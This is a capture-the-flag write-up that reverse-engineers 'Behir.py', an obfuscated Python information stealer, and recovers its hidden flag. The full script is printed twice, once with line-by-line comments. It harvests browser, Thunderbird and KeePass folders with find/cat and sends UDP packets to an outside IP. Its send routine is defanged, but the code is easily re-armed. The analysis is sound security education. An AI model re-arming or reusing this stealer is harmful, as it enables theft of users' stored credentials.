# Task  
The information stealer Behir.py ate everything - including the flag. It
should be somewhere in the malware. Be careful though, it's still a dangerous
monster.

Abjuri5t (John F)  
*Important note: In its default state, the script is "defanged" and shouldn't exfiltrate any stolen information. However, this can easily be changed and you may accidentally harm your computer while solving the challenge. PLEASE make sure that you run this malware in a virtual machine/isolated lab/sandboxed enviornment. The sample file is stored in an encrypted zip with the password "infected". I am not responsible if your sensitive information is stolen.

# Unzipped malware code  
Let's unzip the encrypted zip file and look at Behir.py:  
```  
tressym = "fa86075165f2630ff80397bf98323716"  
lightning = [".chrom"]  
adventure = '/'

import os  
import subprocess  
import socket  
import hashlib  
import time

def main():  
   ranger = int(time.time())  
   if(str(hashlib.md5(open(__file__, "rb").read()[43:]).hexdigest()) ==
tressym):  
       ether = -1  
       crawlingclaw = "who" + "ima"[::ether]  
       ether = ether + 1  
       owlbear = os.popen(crawlingclaw).read().split('\n')[ether]  
       lightning[ether] = lightning[ether] + "iu" + lightning[ether][ether -1] + adventure  
       pi = "PI.3.14159265"  
       yeti = "pass"  
       ether = ether + 1  
       ancestral = makesoul(yeti)   
       arcane = "_info.log"  
       ancestral[ether] = chr(123) + 'n' + makesoul(yeti)[ether].split('n')[ether]  
       gold = "stolen" + arcane  
       ancestral[ether] = 'w' + pi.split('.')[ether - ether] + ancestral[ether]  
       gold = gold.replace('_', '-')  
       for torrent in ancestral:  
           lightning.append(torrent)  
       ether = ether - ether  
       lightning.append(".kee" + yeti + '2' + adventure)  
       for fire in range(len(lightning)):  
           lightning[fire] = lightning[fire].replace('_', '-')  
           lightning[fire] = lightning[fire].replace('w', 'W')  
       bludgeoning = int(time.time())  
       if(bludgeoning - ranger <= 2):  
           evocation = len(lightning)  
           for castle in range(evocation): #Ya the ".keepass2/" one is ambitious... but I have seen malware do this  
               devour(lightning[castle], owlbear, gold)  
           for aboleth in range(evocation):  
               lightning.pop(ether)  
           circle("WPI")

def devour(poison, gods, tome):  
   ether = -1  
   if(poison[ether] == adventure):  
       cat = "cat"  
       buckler = adventure + "home" + adventure + gods + adventure + poison  
       lightning.append(bytes(buckler, "ascii"))  
       acid = "find " + buckler + " -type f -exec " + cat + " {} + > " + tome  
       os.system(acid)  
       spell = open(tome, "rb")  
       ate = spell.read()  
       spell.close()  
       lightning.append(ate)

def circle(viciousMockery):  
   ether = 0  
   roc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
   while(ether < 1337):  
       ether = ether + 1  
   for elf in lightning:  
       drow = bytes('0', "ascii") #I remove the data, but you REALLY should run this in a sandboxed environment  
       roc.sendto(drow, ("158.58.184.213", ether)) #this is not a nice IP, be careful what you send here

def makesoul(orb):  
   soul = []  
   litch = soulMore(orb)  
   soul.append(litch)  
   soul.append(soul[0].lower())  
   litch = swords()  
   soul[0] = litch + "Ice" + "weasel"  
   soul[0] = soul[0] + adventure  
   soul[1] = soul[1] + chr(125)  
   soul.append(litch + "Thunder" + "bird" + adventure)  
   return soul

def soulMore(craft):  
   ether = 0  
   vampire = ""  
   eldritch = ["auto", "fill", craft, "word"]  
   eldritch[ether] = eldritch[ether] + eldritch[ether + 1]  
   ether = ether + 1  
   eldritch[ether] = eldritch[ether + ether] + eldritch[ether + ether + ether]  
   eldritch[len(eldritch) - ether] = "NEVER"  
   eldritch[len(eldritch) - 2] = "use"  
   eldritch = eldritch[::-1]  
   for martial in eldritch:  
       vampire = vampire + '_'  
       vampire = vampire + martial  
   return vampire

def swords():  
   ether = -1  
   return chr(46) + lightning[ether + 1][4:6][::ether] + "zilla" + adventure

main()  
```  
It is an obfuscated Python "malware"; looks like it does data exfiltration,
sending data to 158.58.184.213. Let's reverse it by doing static analysis.

# Writeup  
At first, it checks for the integrity of itself, by computing the MD5 digest
and checking it against a pre-computed one, so if you modify the file without
modifying the digest, the malware won't "explode".

At last, before preparing data to send and before sending data, it checks that
the execution so far less took less than 2 seconds: it is a form of anti-
debugging.

In the middle, there are obfuscated lines of code and obfuscated functions:
the malware reads data from different common folders containing sensitive user
data, using system commands.

The idea is that it uses the first obfuscated part to prepare the names of the
targets, and the second part (after the "anti-debug check") to execute
commands to prepare the data that will be sent.

At this point, the best thing is to look again at the Python file, but with
comments: to solve the challenge, we followed the execution flow one
instruction at a time, by hand, writing the results of instructions and the
values of variables in comments.

```  
tressym = "fa86075165f2630ff80397bf98323716"  
lightning = [".chrom"]  
adventure = '/'

import os  
import subprocess  
import socket  
import hashlib  
import time

def main():  
   ranger = int(time.time())  
   if(str(hashlib.md5(open(__file__, "rb").read()[43:]).hexdigest()) ==
tressym):       # if you change it, you have to update md5 tressym  
       ether = -1  
       crawlingclaw = "who" + "ima"[::ether]	# whoami  
       ether = ether + 1  
       owlbear = os.popen(crawlingclaw).read().split('\n')[ether]	# execute whoami and save the result in owlbear  
       lightning[ether] = lightning[ether] + "iu" + lightning[ether][ether -1] + adventure	# .chromium/ in lightning[0]  
       pi = "PI.3.14159265"  
       yeti = "pass"  
       ether = ether + 1	# at this poit, ether is equal to 1  
       ancestral = makesoul(yeti)   
       # ancestral: [".mozilla/Iceweasel/", "never_use_password_autofill}", ".mozilla/Thunderbird/"]  
       arcane = "_info.log"  
       ancestral[ether] = chr(123) + 'n' + makesoul(yeti)[ether].split('n')[ether]  
       # ancestral[1]: "{never_use_password_autofill}"  
       gold = "stolen" + arcane	# stolen_info.log  
       ancestral[ether] = 'w' + pi.split('.')[ether - ether] + ancestral[ether]  
       # ancestral[1]: wPI{never_use_password_autofill}  
       gold = gold.replace('_', '-')	# stolen-info.log  
       for torrent in ancestral:  
           lightning.append(torrent)  
       # lightning = [".chromium/", ".mozilla/Iceweasel/", "wPI{never_use_password_autofill}", ".mozilla/Thunderbird/"]  
       ether = ether - ether	# 0, obviously  
       lightning.append(".kee" + yeti + '2' + adventure)	# .keepass2/  
       for fire in range(len(lightning)):  
           lightning[fire] = lightning[fire].replace('_', '-')  
           lightning[fire] = lightning[fire].replace('w', 'W')  
	# lightning = ['.chromium/', '.mozilla/IceWeasel/', 'WPI{never-use-passWord-autofill}', '.mozilla/Thunderbird/', '.keepass2/']  
       bludgeoning = int(time.time())  
       if(bludgeoning - ranger <= 2):	# if the execution took less than 2 seconds  
           evocation = len(lightning)	# 5  
           for castle in range(evocation): #Ya the ".keepass2/" one is ambitious... but I have seen malware do this  
               devour(lightning[castle], owlbear, gold)	# second and third parameter: <user> (result of whoami), stolen-info.log  
           for aboleth in range(evocation):  
               lightning.pop(ether)  
           # at this point, lightning is much like before, but strings are in byte format, like b'.chromium/' and so on, and between a folder name and another  
           # there is the CONTENT in byte format read from the previously specified folder  
           circle("WPI")	# input parameter is unused; this function performs data exfiltration, by sending 'lightning' list

def devour(poison, gods, tome):  
   ether = -1  
   if(poison[ether] == adventure):      # true for all elements of lightning
that are in the list before 'devour' function calls  
       cat = "cat"  
       buckler = adventure + "home" + adventure + gods + adventure + poison	# /home/<user>/lightning[i] , for example /home/mike/.chromium/  
       lightning.append(bytes(buckler, "ascii"))	# for example b'.chromium/'  
       acid = "find " + buckler + " -type f -exec " + cat + " {} + > " + tome	# find /home/<user>/lightning[i] -type -f -exec cat {} + > stolen-info.log  
       os.system(acid)	# make a query and if the file is there, read its contents and copy them to stolen-info.log  
       spell = open(tome, "rb")	# read result from stolen-info.log  
       ate = spell.read()  
       spell.close()  
       lightning.append(ate)		# append sensitive data read to lightning

def circle(viciousMockery):  
   ether = 0  
   roc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
   while(ether < 1337):  
       ether = ether + 1  
   for elf in lightning:  
       # it is implemented like a stub, because like you can see, 'elf' variable is not sent  
       drow = bytes('0', "ascii") #I remove the data, but you REALLY should run this in a sandboxed environment  
       roc.sendto(drow, ("158.58.184.213", ether)) #this is not a nice IP, be careful what you send here

def makesoul(orb):  
   soul = []  
   litch = soulMore(orb) # f"NEVER_use_{orb}word_autofill"  
   soul.append(litch)  
   soul.append(soul[0].lower()) # at this point, soul is a list of 2 elements;
the second is f"never_use_{orb.lower()}word_autofill"  
   litch = swords()     # .mozilla/  
   soul[0] = litch + "Ice" + "weasel" # f".mozilla/Iceweasel"  
   soul[0] = soul[0] + adventure # f".mozilla/Iceweasel/"  
   soul[1] = soul[1] + chr(125) # f"never_use_{orb.lower()}word_autofill}"  
   soul.append(litch + "Thunder" + "bird" + adventure) # element added:
f".mozilla/Thunderbird/"  
   return soul          # [".mozilla/Iceweasel/",
f"never_use_{orb.lower()}word_autofill}", ".mozilla/Thunderbird/"]

def soulMore(craft):  
   ether = 0  
   vampire = ""  
   eldritch = ["auto", "fill", craft, "word"]  
   eldritch[ether] = eldritch[ether] + eldritch[ether + 1]      # "autofill"
at index 0  
   ether = ether + 1  
   eldritch[ether] = eldritch[ether + ether] + eldritch[ether + ether + ether]
# craft + "word" at index 1  
   eldritch[len(eldritch) - ether] = "NEVER"    # "NEVER" at index 3  
   eldritch[len(eldritch) - 2] = "use"          # "use" at index 2  
   eldritch = eldritch[::-1]    # at this point eldritch is: ["NEVER", "use",
craft + "word", "autofill"]  
   for martial in eldritch:  
       vampire = vampire + '_'  
       vampire = vampire + martial  
   return vampire       # f"NEVER_use_{craft}word_autofill"

def swords():  
   ether = -1  
   return chr(46) + lightning[ether + 1][4:6][::ether] + "zilla" + adventure
# .mozilla/

main()  
```  
After a few failed attempts with the CTF's website, we found out what was the
flag:  
```  
WPI{never-use-password-autofill}  
```

Original writeup
(https://pwnthenope.github.io/writeups/2021/04/27/behir.html).